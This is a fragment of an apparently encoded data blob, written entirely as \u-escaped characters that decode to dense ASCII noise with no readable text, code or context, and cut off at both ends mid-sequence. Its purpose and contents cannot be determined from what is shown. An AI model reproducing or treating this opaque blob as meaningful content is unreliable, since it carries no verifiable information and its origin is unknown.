005d\u003f\u0043\u006f\u0031\u004e\u0032\u0071\u0059\u0078\u0052\u003c\u004b\u0051\u002a\u007c\u0040\u0064\u006f\u0076\u0029\u0066\u0069\u007d\u005b\u007d\u005a\u0038\u002c\u0079\u007d\u0072\u004a\u007b\u0056\u005e\u0067\u0053\u0054\u0063\u003d\u0040\u0048\u003a\u0061\u0049\u0052\u006a\u0029\u0055\u0052\u004d\u002c\u0057\u007c\u0059\u0043\u0021\u005f\u005d\u0052\u0039\u0030\u0023\u0067\u0036\u006d\u003a\u0030\u003c\u003d\u002b\u006f\u006c\u0072\u0056\u0057\u006a\u0042\u0040\u0032\u002e\u0045\u0054\u0040\u006b\u006c\u006b\u0076\u002f\u0052\u0060\u004c\u0065\u007e\u003f\u006a\u0060\u003b\u003b\u007a\u0061\u0045\u0066\u0074\u0024\u0061\u0034\u0056\u0070\u0045\u0055\u0025\u004f\u0040\u0068\u0046\u002f\u0069\u0037\u003a\u0074\u0023\u004f\u003c\u0025\u0066\u0023\u0046\u0050\u0047\u0060\u004b\u0034\u006e\u005b\u0033\u005f\u0021\u0024\u0031\u004f\u005f\u0040\u005e\u0049\u005f\u0074\u004a\u0068\u0033\u0060\u0062\u0051\u0023\u0051\u0039\u005f\u003e\u003d\u006e\u0044\u007e\u0063\u007b\u0030\u0066\u0076\u0051\u004f\u0023\u0023\u0047\u0042\u006b\u007a\u0066\u0074\u0076\u0069\u0022\u0062\u003b\u005b\u0052\u002a\u0060\u006a\u004e\u0044\u0043\u0040\u003c\u0023\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u0031\u005e\u0041\u0076\u0023\u005d\u0043\u0037\u0077\u003b\u007a\u0035\u0048\u0041\u006b\u005e\u006a\u0051\u0032\u0078\u0051\u006a\u003a\u0046\u0072\u0031\u0044\u003a\u0034\u003d\u005f\u0076\u0045\u006c\u0025\u0066\u0065\u0078\u0055\u003a\u005d\u003b\u002a\u0063\u0046\u007e\u004b\u0045\u0077\u0075\u0042\u0035\u0047\u0021\u0035\u0060\u0021\u0025\u0057\u0072\u0053\u0059\u0026\u0024\u0044\u003a\u0051\u0056\u0038\u0042\u0054\u003e\u0057\u006b\u0043\u006b\u004c\u003f\u0034\u0052\u004f\u006f\u0026\u0068\u0022\u0033\u0076\u005b\u0022\u006b\u0034\u003d\u0053\u004d\u0034\u0066\u0060\u006a\u006d\u0051\u0029\u006f\u0025\u0040\u005e\u003f\u0059\u0069\u0072\u002a\u0056\u0075\u004f\u0070\u0030\u0036\u0023\u0072\u002e\u006f\u0049\u0048\u0022\u0063\u0021\u007c\u0070\u0051\u0038\u0052\u003a\u0043\u004e\u0046\u0064\u0039\u0025\u004d\u0031\u0033\u0026\u0062\u004e\u0049\u004d\u0061\u004a\u0070\u0022\u002e\u003b\u0026\u0044\u0063\u0073\u006c\u0042\u0028\u0021\u0038\u0042\u0026\u004a\u0070\u0028\u0067\u0059\u0065\u006d\u004c\u0065\u007e\u003f\u006a\u0060\u003b\u003b\u007a\u0061\u0045\u0066\u0031\u0064\u004d\u0026\u005a\u0076\u006b\u003c\u0040\u0078\u007d\u0056\u002c\u0025\u003c\u004b\u003d\u003c\u0050\u0077\u003b\u006d\u0052\u0062\u002f\u005f\u006a\u005f\u007a\u0074\u0054\u0050\u0057\u0060\u005e\u0057\u003c\u006d\u005b\u002e\u0078\u007d\u0046\u0073\u004d\u0035\u0025\u006e\u002a\u003f\u004c\u004c\u0024\u002f\u0068\u0048\u0068\u002b\u0066\u0060\u0042\u0035\u0047\u0021\u0022\u003a\u004f\u005a\u006b\u0032\u0077\u0039\u007c\u0024\u0044\u003a\u0064\u0057\u003d\u0055\u007d\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u0031\u005e\u0041\u0076\u0023\u005d\u0043\u0037\u0077\u003b\u007a\u0035\u0048\u0041\u006b\u005e\u006a\u0051\u0032\u0078\u0051\u006a\u003a\u0046\u0072\u0031\u0044\u003a\u0034\u003d\u005f\u0076\u0045\u006c\u0025\u0066\u0065\u0078\u0055\u003a\u005d\u003b\u002a\u0063\u0046\u007e\u004b\u0045\u0077\u0075\u0042\u0035\u0047\u0021\u0035\u0060\u0021\u0025\u0057\u0072\u0053\u0059\u0026\u0024\u0044\u003a\u0051\u0056\u0038\u0042\u0054\u003e\u0057\u006b\u0043\u006b\u004c\u003f\u0034\u0052\u004f\u006f\u0026\u0068\u0022\u0033\u0076\u005b\u0022\u006b\u0034\u003d\u0053\u004d\u0034\u0066\u0060\u006a\u006d\u0051\u003f\u0036\u0061\u006d\u0054\u004f\u0033\u004f\u0021\u004b\u0046\u0075\u0075\u0032\u002c\u0029\u0074\u0072\u004a\u005b\u004f\u0065\u0033\u004f\u0062\u004b\u0038\u0021\u002c\u0066\u003f\u002c\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0053\u0043\u003c\u005d\u0053\u0034\u0073\u0039\u005d\u0074\u007d\u006c\u002a\u006d\u0069\u005a\u004c\u0065\u007e\u003f\u006a\u0060\u003b\u003b\u007a\u0061\u0045\u0066\u0031\u0064\u006c\u0060\u005f\u0024\u0025\u0075\u0068\u0069\u003e\u006e\u0058\u0022\u0068\u002e\u0066\u0054\u003b\u007a\u0061\u0045\u0066\u0074\u0048\u0063\u0025\u0070\u005e\u007d\u0056\u007b\u0025\u002e\u003b\u006f\u0074\u0047\u002e\u0072\u0046\u003b\u0048\u003c\u0039\u0023\u007b\u004a\u0078\u0036\u006e\u0042\u0023\u004d\u0078\u002c\u0074\u006d\u005d\u0078\u0041\u007b\u0069\u0030\u0066\u0076\u0051\u004f\u0023\u0023\u0047\u0042\u006b\u007a\u0066\u0042\u0069\u0048\u002b\u005a\u0042\u004e\u0032\u005e\u0050\u0079\u007c\u0024\u006a\u0067\u0031\u0066\u0042\u006f\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u0031\u005e\u0041\u0076\u0023\u005d\u0043\u0037\u0077\u003b\u0024\u006b\u005b\u002b\u0042\u0040\u0022\u0041\u002a\u006c\u0037\u005d\u0024\u0043\u0054\u003e\u0021\u0066\u007c\u0078\u0048\u0041\u007c\u0024\u003f\u0050\u0023\u004f\u0051\u006a\u0059\u0047\u0060\u002b\u0042\u0029\u005f\u005d\u0026\u002a\u0039\u0037\u0060\u0055\u0052\u004d\u0068\u0026\u0054\u0036\u003a\u0053\u0039\u0064\u0025\u0065\u0034\u0026\u0073\u004d\u0034\u0066\u0074\u004c\u0073\u0033\u0032\u0077\u006e\u0029\u0069\u002b\u0073\u005b\u002f\u0079\u0054\u006b\u0054\u007b\u004f\u005d\u004c\u0071\u0054\u0047\u005d\u0076\u0052\u005b\u0059\u004f\u006c\u0037\u0046\u0058\u0022\u0066\u0056\u0031\u0064\u0026\u0024\u0044\u003a\u005e\u006f\u0031\u0063\u0042\u007c\u0070\u0051\u0033\u0052\u003a\u0043\u0079\u0046\u002a\u004f\u0068\u0078\u0070\u004e\u004a\u0041\u0060\u0053\u0023\u005b\u0065\u0076\u0029\u006f\u007d\u0040\u005e\u003f\u0066\u0069\u0072\u002a\u0021\u0059\u0030\u0048\u0042\u003f\u0021\u0069\u0024\u0057\u003e\u005f\u0058\u0036\u0021\u0028\u002a\u004f\u0035\u0053\u005e\u0041\u003e\u0077\u0063\u0078\u007e\u0068\u0073\u006b\u006c\u0051\u002a\u0049\u0024\u007d\u0070\u0076\u0051\u0052\u002a\u003e\u006a\u0076\u003c\u005e\u0077\u0029\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u005d\u003f\u0043\u006f\u0031\u004e\u0032\u0045\u0041\u007e\u0062\u0055\u004a\u0079\u0063\u007c\u0040\u0064\u006f\u0076\u007a\u004b\u0028\u005b\u007d\u005a\u0038\u002c\u0079\u007d\u0072\u004a\u007b\u0056\u005e\u0024\u0065\u002a\u0038\u007a\u004f\u005f\u0076\u0047\u0051\u005b\u0065\u007c\u0024\u0032\u0077\u006f\u0060\u0058\u002f\u0043\u0059\u004f\u004e\u006a\u0026\u0039\u007b\u002f\u005f\u005d\u0052\u0039\u0030\u0023\u006c\u0039\u004c\u0065\u007e\u003f\u006a\u0060\u003b\u003b\u007a\u0061\u0045\u0066\u0031\u0064\u004d\u0026\u002b\u007c\u0029\u002b\u003f\u0060\u004a\u005a\u0076\u0053\u0068\u007b\u0077\u0074\u0042\u0078\u0061\u0043\u0024\u006f\u0062\u007e\u002f\u0069\u006c\u0056\u003c\u004b\u0022\u0062\u0031\u004f\u0024\u0069\u0075\u0075\u0032\u002c\u0029\u0059\u003e\u0059\u0074\u0072\u004a\u005b\u004f\u0065\u0033\u004f\u0043\u0044\u0042\u0064\u0059\u006d\u0061\u0030\u0031\u002f\u0052\u004f\u006f\u0026\u0068\u004e\u007b\u0044\u0070\u0054\u004b\u0058\u0072\u007e\u0047\u0031\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u0060\u0051\u0052\u002a\u002f\u003d\u006f\u0060\u003a\u004d\u0032\u0057\u0070\u0041\u007e\u0048\u002e\u0066\u004d\u004c\u0031\u0062\u0056\u0069\u003a\u005d\u0029\u0030\u0021\u0045\u0066\u0025\u0028\u0064\u007b\u002a\u002e\u0026\u0075\u0071\u0058\u004b\u002e\u007b\u006f\u0071\u002e\u0067\u0063\u004a\u0070\u0065\u005d\u0059\u0050\u0070\u002c\u006f\u0072\u0078\u003b\u0062\u005f\u0058\u0036\u0021\u0028\u002a\u004f\u0035\u0053\u005e\u0041\u003e\u0077\u0063\u0078\u007e\u0068\u0073\u006b\u006c\u0051\u002a\u0049\u0024\u003f\u003d\u0023\u007a\u004c\u004c\u0065\u007e\u003f\u006a\u0060\u003b\u003b\u007a\u0061\u0045\u0066\u0031\u0064\u004d\u0026\u005a\u0076\u0053\u0068\u007b\u0077\u0074\u0042\u0078\u0061\u0043\u0024\u002c\u0069\u0077\u007b\u005b\u0033\u005f\u0021\u0024\u0031\u004f\u005f\u0040\u005e\u0049\u005f\u003c\u006f\u0042\u006f\u0035\u0031\u0029\u0030\u007a\u004c\u0030\u0066\u0076\u0051\u004f\u0023\u0023\u0047\u0042\u006b\u007a\u0066\u0042\u0069\u004e\u0045\u0071\u002b\u004c\u0044\u004f\u0045\u006f\u0074\u0079\u0062\u0046\u0079\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u0060\u0051\u0052\u002a\u002f\u003d\u006f\u0060\u003a\u004d\u0032\u0057\u0070\u0041\u007e\u0048\u002e\u0066\u004d\u004c\u0031\u0062\u0056\u0069\u003a\u005d\u0029\u0030\u0021\u0045\u0066\u0025\u0028\u0064\u005a\u0038\u003a\u0037\u004a\u003e\u0049\u006b\u003f\u0039\u0040\u0039\u0058\u0048\u007c\u0021\u0022\u006b\u0031\u0074\u004f\u0037\u0042\u0062\u0035\u0022\u0053\u005e\u0042\u0064\u006e\u002a\u003f\u004c\u0061\u003c\u006d\u005b\u002e\u0078\u007d\u0046\u0073\u004d\u0035\u0025\u006e\u002a\u0046\u0053\u005b\u0048\u0032\u0061\u0039\u0023\u007b\u004a\u0042\u004a\u004e\u006a\u006c\u007d\u0041\u006c\u0079\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u005d\u003f\u0043\u006f\u0031\u004e\u0032\u003d\u007e\u0073\u006c\u0045\u0072\u0033\u0025\u007c\u0040\u0064\u006f\u0076\u006d\u0063\u003a\u0062\u0060\u0058\u006a\u005b\u002e\u0078\u0051\u006a\u006a\u004e\u0072\u0044\u0024\u0064\u0072\u007b\u005d\u0037\u004e\u003e\u0057\u0057\u0028\u005e\u0070\u005f\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u0044\u0029\u0053\u005b\u005d\u0050\u005b\u0025\u002f\u003e\u0049\u006b\u006d\u0032\u0077\u0039\u003a\u004d\u006a\u0042\u0062\u0032\u002b\u0059\u002c\u0062\u0035\u005b\u0075\u0035\u0058\u006a\u004a\u0024\u0045\u0023\u0059\u0046\u004c\u0068\u005e\u006d\u0022\u0051\u0071\u0065\u006e\u0056\u0073\u003a\u0064\u0064\u0077\u0063\u0077\u0039\u004d\u0021\u0062\u0049\u002a\u0065\u0041\u003c\u0072\u0042\u0035\u0047\u0021\u0022\u003a\u0064\u0064\u0073\u0032\u004e\u0045\u0076\u0021\u0061\u0044\u004f\u0045\u0021\u003e\u006b\u0041\u0022\u0026\u0023\u005b\u0070\u0076\u0029\u006f\u0025\u0040\u005e\u003f\u0059\u0069\u0072\u002a\u0056\u0075\u004f\u0070\u0030\u0036\u0023\u0072\u002e\u006f\u0049\u0048\u0024\u007e\u0079\u0061\u006a\u0029\u006f\u0025\u0040\u005e\u003f\u0028\u004a\u003e\u003a\u0052\u003b\u007e\u0065\u0045\u0041\u0068\u002b\u0054\u003a\u004e\u0049\u0030\u0078\u0021\u006f\u006a\u0030\u0079\u0030\u0070\u0041\u0028\u002b\u0054\u003a\u0031\u0030\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u006d\u0031\u0045\u003f\u0063\u003a\u0073\u0033\u0044\u0038\u002c\u0029\u003f\u0024\u0057\u0068\u0069\u0065\u0074\u0061\u0046\u006d\u0021\u0028\u002a\u0079\u002e\u005a\u0047\u0070\u0029\u006b\u0024\u0023\u006b\u0035\u004b\u0040\u0046\u005a\u004f\u006c\u0047\u0046\u0022\u0032\u002f\u0068\u0038\u0057\u0049\u003f\u0048\u0022\u005a\u002b\u0035\u0074\u0048\u0051\u0073\u0061\u0044\u004f\u0045\u0031\u0033\u0076\u005b\u002e\u0078\u0074\u0028\u0050\u006a\u0029\u0023\u0076\u0021\u0069\u004b\u0023\u0051\u007c\u0040\u0022\u0041\u0072\u0034\u0041\u0024\u0044\u0021\u006a\u003e\u0048\u006e\u005a\u0059\u0023\u006c\u0021\u0028\u002a\u007e\u0037\u006f\u003a\u003d\u0066\u0074\u003d\u003f\u0036\u0061\u006d\u0054\u004f\u004e\u006a\u005b\u0061\u0022\u0031\u0059\u0036\u0069\u0072\u004e\u004a\u0045\u006a\u0070\u0062\u0062\u0051\u0023\u0051\u0039\u005f\u0060\u006a\u0057\u003e\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u0044\u0029\u0053\u005b\u005d\u0050\u005b\u0025\u002f\u003e\u0049\u006b\u006d\u0032\u0077\u0039\u003a\u004d\u0030\u0028\u005b\u0065\u0069\u005e\u0078\u0037\u003e\u0069\u0059\u005b\u0034\u0077\u0025\u0043\u0031\u0051\u005b\u0065\u0059\u0037\u006f\u003a\u003d\u0066\u0032\u0077\u006e\u0029\u0069\u002b\u0073\u005b\u002f\u0079\u0054\u006b\u0054\u007b\u004f\u005d\u004c\u0071\u0054\u0047\u005d\u0076\u0052\u005b\u0059\u004f\u006c\u0037\u0053\u004e\u0078\u0065\u002b\u0039\u0021\u0036\u006c\u004b\u002e\u006f\u0064\u0061\u0022\u0063\u0042\u007c\u0070\u0051\u0033\u0052\u003a\u0043\u0079\u0046\u002a\u004f\u0068\u0078\u0070\u004e\u004a\u0041\u0060\u0053\u0023\u005b\u0065\u0076\u0029\u006f\u0023\u0039\u0078\u0079\u0046\u0024\u0054\u0043\u0021\u002e\u003c\u006a\u0079\u0045\u005a\u007a\u0025\u006b\u006d\u0078\u0064\u0042\u0054\u003e\u005a\u0078\u002e\u0032\u007a\u0045\u005a\u007a\u0024\u002c\u0048\u0058\u0031\u003c\u0062\u0051\u0065\u0078\u0051\u006a\u002a\u005a\u0048\u0058\u006c\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u0076\u006a\u0034\u004e\u0034\u0024\u006d\u0032\u0029\u0041\u004a\u0073\u0051\u0025\u0046\u0058\u004e\u0072\u0039\u0021\u0049\u004c\u0064\u002e\u0078\u0022\u0035\u0043\u0057\u0049\u005f\u0056\u0042\u003a\u004b\u0075\u0052\u0057\u0069\u0055\u003b\u005b\u0035\u0076\u005e\u003e\u0051\u003d\u006a\u0070\u0071\u004a\u0077\u0041\u005b\u007d\u005a\u0038\u002c\u0079\u007d\u0072\u004a\u007b\u0056\u005e\u0067\u0053\u0054\u0063\u003d\u0040\u0048\u003a\u0061\u0049\u0059\u0061\u003c\u006f\u0078\u0072\u007d\u0073\u004e\u0045\u0079\u003e\u002e\u002a\u006f\u003f\u003e\u0023\u0067\u0036\u0050\u004b\u0060\u0065\u003d\u003d\u002b\u006f\u006c\u0072\u0056\u003e\u0042\u0023\u004d\u004b\u0036\u0057\u0068\u0062\u0051\u006e\u0045\u0039\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u007d\u003a\u006a\u0051\u0040\u005b\u0051\u006a\u0033\u0056\u005a\u004a\u0039\u0063\u0077\u0039\u0054\u0052\u004f\u006f\u0026\u0068\u0021\u0070\u0058\u004d\u0030\u0025\u0024\u0040\u0063\u004c\u0022\u003f\u004a\u002a\u004f\u0022\u0021\u005f\u005d\u0073\u0079\u0024\u0061\u004b\u006f\u0043\u003b\u0050\u0063\u003d\u003f\u0065\u0041\u0038\u0066\u004d\u004c\u0031\u0062\u005e\u0069\u0022\u0031\u006d\u0053\u0030\u0039\u004d\u0021\u005f\u005d\u0073\u0079\u007b\u0061\u0072\u002a\u0056\u0075\u004f\u0070\u0071\u006c\u0077\u0069\u006d\u0054\u007b\u0065\u0029\u006f\u0025\u0040\u005e\u003f\u0059\u0069\u0072\u002a\u0056\u0075\u004f\u0070\u0030\u0036\u0023\u0072\u002e\u006f\u0049\u0048\u0022\u0063\u0021\u007c\u0070\u0051\u0073\u003e\u0029\u0047\u0021\u0069\u0025\u006b\u0065\u005f\u0034\u003d\u006e\u0044\u0045\u0031\u0068\u0072\u003f\u0041\u0062\u0051\u0023\u0051\u0039\u005f\u003e\u003d\u006e\u0044\u0077\u0069\u0035\u0064\u0042\u004a\u0073\u0033\u0032\u005d\u007b\u0029\u0069\u0051\u005b\u006a\u004e\u002a\u0074\u003d\u0029\u0030\u004a\u0056\u0057\u0079\u0028\u002a\u0079\u0023\u0047\u0042\u006b\u007a\u0066\u0073\u0075\u0069\u0035\u0031\u003e\u003d\u0040\u004a\u005b\u002f\u0079\u007c\u0024\u005e\u0069\u0022\u0031\u0024\u006a\u007a\u005b\u0039\u0041\u0069\u002b\u0073\u005b\u0073\u0051\u002a\u0036\u002a\u0024\u0045\u0023\u0059\u0046\u006d\u005d\u003e\u0067\u005d\u0076\u0052\u005b\u0059\u004f\u006c\u0037\u0053\u004e\u0078\u0065\u0074\u0073\u0055\u0025\u0074\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u007d\u003a\u005d\u006c\u0052\u0043\u005e\u0055\u0057\u0059\u0045\u0045\u006c\u0032\u005d\u007d\u0039\u0060\u0055\u0043\u003b\u002c\u0079\u0036\u004b\u005f\u0024\u0052\u0046\u006d\u0025\u0042\u003d\u0029\u0051\u005e\u006d\u0022\u0051\u0071\u0065\u006e\u0056\u0030\u0060\u0074\u0050\u0047\u0063\u0077\u0039\u0026\u0024\u005b\u0026\u0024\u004f\u0037\u0042\u0062\u0054\u0047\u0042\u006b\u007a\u0066\u006a\u0057\u0070\u0041\u0064\u0076\u0041\u004a\u0070\u0065\u0074\u004a\u0066\u0025\u0028\u0064\u002b\u0078\u0070\u004e\u004a\u0041\u0060\u0053\u0023\u005b\u0065\u0076\u0029\u006f\u007d\u0040\u005e\u003f\u0066\u0069\u0072\u002a\u0040\u0075\u0039\u0045\u0030\u0036\u006c\u004b\u002e\u006f\u0064\u0061\u0022\u0063\u0042\u007c\u0035\u006a\u0032\u0076\u004f\u006a\u0024\u0068\u006d\u0065\u0049\u003d\u0035\u0053\u005e\u0042\u0064\u006e\u002a\u003f\u004c\u005d\u0074\u002f\u003c\u004a\u0029\u0052\u005b\u005d\u0050\u0056\u003d\u0021\u0037\u003e\u003b\u0022\u006a\u0047\u002b\u002b\u0048\u004c\u0076\u006c\u0037\u0051\u006e\u0032\u003f\u006a\u0057\u0072\u0040\u004c\u0049\u005a\u0057\u007b\u004a\u0057\u0046\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u0048\u0073\u0042\u0069\u003c\u0079\u0075\u0077\u0045\u004e\u0028\u005b\u0065\u0060\u0042\u002b\u004c\u0060\u0055\u0069\u0030\u0048\u0064\u0060\u0030\u003d\u007c\u0041\u0073\u0021\u0077\u005d\u0021\u006f\u002e\u0026\u0067\u0069\u005e\u006c\u0035\u0072\u006d\u0071\u005e\u003f\u0079\u0060\u0058\u0066\u004a\u0040\u005b\u004e\u006a\u0055\u0077\u0064\u0035\u006c\u0062\u0051\u0032\u0078\u0051\u006a\u0079\u003e\u002e\u002a\u006f\u003f\u003e\u0023\u0067\u0036\u0050\u002b\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u004c\u0070\u006b\u0021\u007a\u0078\u006c\u0037\u003c\u006f\u0028\u006b\u0059\u006d\u004b\u007b\u005a\u0057\u007b\u004a\u0068\u0046\u0022\u0032\u002f\u0068\u0038\u0057\u0049\u003f\u002e\u0045\u0022\u0021\u005f\u005d\u0073\u0079\u002c\u0068\u007e\u0037\u004e\u0034\u0056\u0032\u0039\u0047\u0025\u0077\u005e\u006c\u007c\u0030\u0064\u003b\u0023\u004d\u007c\u004d\u003a\u006b\u004c\u003f\u0034\u0052\u006b\u006b\u0065\u005f\u0034\u003d\u006e\u0044\u0045\u0031\u0068\u0072\u003f\u0041\u0062\u0051\u0023\u0051\u0039\u005f\u003e\u003d\u006e\u0044\u0031\u0073\u0068\u002b\u0062\u0051\u0049\u007a\u0050\u0068\u0053\u004d\u006d\u005d\u0025\u0073\u0048\u0029\u0057\u007c\u0064\u0076\u0053\u0051\u005e\u0036\u0055\u0024\u0033\u002e\u0036\u0031\u0078\u0029\u0040\u0076\u005e\u0066\u0035\u0060\u006a\u003a\u007b\u0032\u0067\u004f\u007c\u0064\u0076\u0053\u0051\u005e\u0036\u0050\u0068\u0023\u004d\u002b\u0076\u0057\u0072\u0026\u0029\u0063\u0060\u0021\u007b\u0076\u005e\u006a\u004d\u0067\u0045\u0046\u0025\u0068\u002c\u0062\u0035\u005b\u0075\u0035\u0058\u006a\u0046\u0079\u004b\u0049\u005e\u006d\u0067\u0045\u004c\u004a\u002c\u004a\u0063\u0042\u006a\u0026\u0036\u0067\u0052\u0067\u004a\u0035\u0057\u0037\u0045\u003b\u002f\u006a\u0066\u0070\u0025\u0062\u0074\u0072\u0022\u004d\u0043\u0076\u006a\u0039\u0022\u0078\u0028\u002b\u0061\u0044\u003a\u006b\u003b\u006a\u007b\u0068\u0079\u0066\u006e\u0043\u0077\u006c\u0022\u0051\u0051\u005f\u0063\u006a\u0041\u005d\u0067\u002f\u0032\u005b\u007d\u005a\u0038\u002c\u0079\u0075\u005a\u0061\u003e\u0044\u0035\u006a\u0030\u0039\u0047\u0073\u0033\u0046\u005d\u0030\u0039\u0075\u0040\u005a\u0028\u003e\u005b\u003e\u0026\u0060\u0055\u0052\u004d\u007a\u0035\u0077\u0070\u004a\u0035\u0043\u0044\u0060\u0029\u003a\u0024\u003a\u0046\u0030\u003b\u0042\u0072\u0055\u0058\u003e\u0064\u0053\u0051\u0066\u004f\u0058\u0029\u0034\u004e\u004a\u0072\u0049\u003f\u003f\u0041\u0075\u0057\u0024\u003b\u0052\u0028\u005e\u003c\u002e\u0051\u0048\u0048\u003b\u004d\u0050\u003a\u0037\u0047\u004c\u0062\u0061\u0042\u0051\u003b\u007b\u005b\u006a\u005a\u0035\u005a\u006a\u005b\u006e\u0026\u003c\u0022\u0021\u0051\u007c\u0040\u005b\u0026\u006a\u0074\u006b\u0031\u003c\u002e\u0051\u0048\u0078\u0040\u004e\u006a\u0046\u006f\u0030\u0066\u0073\u0073\u002f\u0063\u0042\u0062\u006f\u006c\u0050\u002a\u0028\u0065\u0023\u0070\u0052\u0034\u007e\u006b\u0061\u0036\u004c\u007e\u0040\u004c\u0044\u0070\u0065\u0030\u007a\u0057\u005e\u004c\u0034\u006a\u0030\u003b\u0045\u0042\u005e\u0076\u005e\u0079\u0078\u0059\u005d\u003f\u0043\u006f\u0031\u004e\u0032\u005d\u0029\u0031\u0052\u005a\u0028\u0053\u0039\u007c\u0040\u0064\u006f\u0076\u003a\u0066\u003a\u0067\u0031\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u0041\u0077\u0037\u005b\u0077\u005b\u0050\u0059\u0063\u0037\u0056\u005e\u0030\u006b\u002c\u0029\u0021\u0057\u0025\u0021\u003d\u0046\u0022\u0032\u002f\u0068\u0038\u0057\u0049\u003f\u0048\u0077\u0028\u0057\u0030\u0051\u0073\u0061\u0044\u004f\u0045\u0031\u0033\u0076\u005b\u002e\u0078\u006c\u0037\u0052\u004d\u007c\u004d\u003a\u006b\u004c\u003f\u0034\u0052\u004f\u006f\u0026\u0068\u0022\u0033\u0076\u005b\u0022\u006b\u0034\u003d\u0053\u004d\u0034\u0066\u0060\u006a\u006d\u0051\u0029\u0066\u0069\u0029\u006f\u0025\u0040\u005e\u003f\u0059\u0069\u0072\u002a\u0056\u0075\u004f\u0070\u0030\u0036\u0023\u0072\u002e\u006f\u0049\u0048\u0022\u0063\u0021\u007c\u0070\u0051\u0038\u0052\u003a\u0043\u004e\u0046\u0064\u0039\u0025\u004d\u0031\u0033\u0026\u0062\u004e\u0049\u004d\u0061\u004a\u0070\u0022\u002e\u003b\u0026\u0044\u0063\u0073\u006c\u0042\u0028\u0021\u0038\u0042\u0026\u004a\u0070\u0028\u004a\u0070\u0072\u0074\u0022\u0062\u003b\u005b\u0052\u002a\u0060\u006a\u0025\u0047\u0056\u003b\u0047\u0063\u0061\u0070\u0070\u005d\u0021\u003e\u004b\u002e\u0078\u0058\u0029\u0034\u004e\u004a\u0072\u0049\u003f\u003f\u0041\u007d\u0036\u0077\u005b\u0079\u0052\u007e\u0059\u0077\u003b\u004e\u002f\u0037\u0069\u0079\u0024\u002f\u0028\u003c\u002e\u0051\u0048\u0068\u0072\u0028\u0065\u0023\u0070\u0035\u0034\u002b\u0021\u0057\u0025\u0021\u0025\u0079\u0057\u006a\u0022\u007b\u006f\u0076\u004a\u005b\u002f\u0079\u0048\u006a\u0066\u0046\u0023\u0043\u002b\u003e\u0050\u0021\u002a\u004e\u005b\u0064\u0079\u0079\u006a\u0058\u002a\u0024\u0061\u0073\u005d\u0030\u0045\u0022\u005e\u002b\u002f\u0045\u006a\u0045\u0046\u0057\u0023\u004e\u005b\u0029\u005f\u0029\u006a\u0043\u004a\u0068\u005a\u0025\u0077\u0024\u0021\u0052\u002a\u005a\u006a\u0074\u006a\u0039\u0063\u0028\u006d\u0036\u0074\u005f\u0072\u0064\u004e\u0029\u0058\u0062\u003c\u0068\u002b\u0023\u0051\u002b\u002f\u005a\u006a\u004e\u0076\u005d\u007a\u0058\u006f\u006c\u0051\u002a\u0034\u006a\u0023\u003d\u0073\u0037\u0051\u0076\u005b\u0023\u0024\u0050\u004b\u0045\u0022\u0051\u0030\u002e\u0060\u006a\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u0041\u0077\u0037\u005b\u0077\u005b\u0045\u006a\u003f\u002c\u0026\u0046\u003c\u0055\u0045\u005f\u005d\u0023\u0038\u0053\u0037\u0023\u004d\u003e\u0031\u0051\u0053\u0054\u0036\u003a\u0053\u0039\u0064\u0025\u0065\u0048\u006a\u0051\u0073\u0061\u0044\u004f\u0045\u0031\u0033\u0076\u005b\u002e\u0078\u006c\u0037\u0052\u004d\u007c\u004d\u003a\u006b\u003a\u0072\u0059\u004a\u0025\u0032\u004d\u0065\u0041\u0038\u0066\u004d\u004c\u0031\u0062\u005e\u0069\u0022\u0031\u006d\u0053\u0030\u0039\u004d\u0021\u005f\u005d\u0073\u0079\u0074\u006a\u002e\u0061\u0063\u0022\u0054\u006b\u005e\u0030\u0028\u0038\u0078\u0051\u006a\u0077\u007c\u005f\u0062\u0023\u006b\u006c\u002f\u0079\u004e\u006a\u006d\u0051\u0067\u0065\u0076\u0025\u0021\u006c\u0059\u0074\u006b\u003b\u0074\u0022\u003a\u0023\u0067\u006e\u0079\u007c\u0039\u0024\u0055\u002a\u0072\u0044\u003a\u0045\u004e\u0041\u0077\u0037\u005b\u0077\u005b\u0050\u0059\u0063\u0037\u0056\u005e\u0030\u006b\u002c\u0029\u0021\u0057\u0025\u0021\u003d\u0046\u0022\u0032\u002f\u0068\u0038\u0057\u0049\u003f\u002e\u0045\u0022\u0021\u005f\u005d\u0073\u0079\u002c\u0068\u0066\u003e\u0043\u003b\u0050\u0063\u007e\u0047\u007b\u0065\u